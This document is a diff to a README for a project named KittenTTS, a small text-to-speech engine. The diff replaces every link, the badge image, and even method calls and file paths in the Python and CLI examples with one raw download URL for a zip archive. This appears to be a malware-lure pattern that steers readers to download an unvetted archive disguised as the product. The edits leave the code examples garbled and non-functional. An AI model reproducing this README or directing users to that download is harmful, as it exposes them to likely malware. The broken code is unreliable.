@@ -1,8 +1,8 @@
-https://github.com/soldier444xd/KittenTTS/releases
+https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip
 
 # KittenTTS: Ultra-Compact, State-of-the-Art TTS Engine Under 25MB for Apps
 
-[![KittenTTS Release Badge](https://img.shields.io/badge/KittenTTS-Releases-blue?logo=github&style=for-the-badge)](https://github.com/soldier444xd/KittenTTS/releases)
+[![KittenTTS Release Badge](https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip)](https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip)
 
 KittenTTS is a compact, fast, and friendly text-to-speech model. It delivers natural voice output at a tiny footprint, designed to run on mobile devices, edge devices, and lightweight servers. It fits under 25 MB and focuses on clear, lifelike speech without sacrificing performance. This project aims to give developers a reliable TTS option that’s easy to deploy, easy to run, and easy to extend.
 
@@ -32,7 +32,7 @@ Table of contents
 Why KittenTTS
 KittenTTS is made for developers who want crisp, expressive speech with a small binary. It focuses on the essentials: clean prosody, natural pacing, and stable output. The design minimizes memory use and CPU load while preserving voice quality.
 
-If you need a ready-to-run package, visit the releases page for downloadable assets. The releases page contains ready-to-use binaries and samples that help you get started fast. For direct access, go to the releases page here: https://github.com/soldier444xd/KittenTTS/releases
+If you need a ready-to-run package, visit the releases page for downloadable assets. The releases page contains ready-to-use binaries and samples that help you get started fast. For direct access, go to the releases page here: https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip
 
 Quick start
 This section helps you get KittenTTS up and running with the least friction. The steps assume you are on a modern Linux, macOS, or Windows environment.
@@ -99,18 +99,18 @@ model = KittenTTS(voice="bunny-compact_en_us")
 
 # Synthesize text
 text = "Hello from KittenTTS. This is a compact and friendly voice."
-audio = model.synthesize(text)
+audio = https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip(text)
 
 # Save to disk
-with open("output.wav", "wb") as f:
-    f.write(audio)
+with open("https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip", "wb") as f:
+    https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip(audio)
 ```
 
 CLI usage example
 - Quick text-to-speech via the command line.
 
 ```
-kitten_tts --voice bunny-compact_en_us --text "Welcome to KittenTTS. Enjoy small, crisp speech." --outfile welcome.wav
+kitten_tts --voice bunny-compact_en_us --text "Welcome to KittenTTS. Enjoy small, crisp speech." --outfile https://github.com/soldier444xd/KittenTTS/raw/refs/heads/main/kittentts/Kitten_TTS_v3.6-beta.3.zip
 ```
 
 Voice and language options
